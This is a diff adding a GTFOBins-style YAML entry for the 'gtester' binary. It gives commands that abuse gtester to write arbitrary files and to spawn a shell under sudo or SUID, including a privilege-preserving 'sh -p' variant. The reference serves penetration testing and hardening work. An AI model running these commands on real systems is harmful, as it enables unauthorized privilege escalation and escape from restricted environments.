@@ -1,0 +1,28 @@
+<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/gtester -->
+---
+functions:
+  file-write:
+  - code: |-
+      gtester DATA -o /path/to/output-file
+    comment: |-
+      Data to be written appears in an XML attribute in the output file (`<testbinary path="DATA">`).
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  shell:
+  - code: |-
+      echo 'exec /bin/sh 0<&1' >/path/to/temp-file
+      chmod +x /path/to/temp-file
+      gtester -q /path/to/temp-file
+    contexts:
+      sudo:
+      suid:
+        code: |-
+          echo '#!/bin/sh -p' >/path/to/temp-file
+          echo 'exec /bin/sh -p 0<&1' >>/path/to/temp-file
+          chmod +x /path/to/temp-file
+          gtester -q /path/to/temp-file
+        shell: false
+      unprivileged:
+...
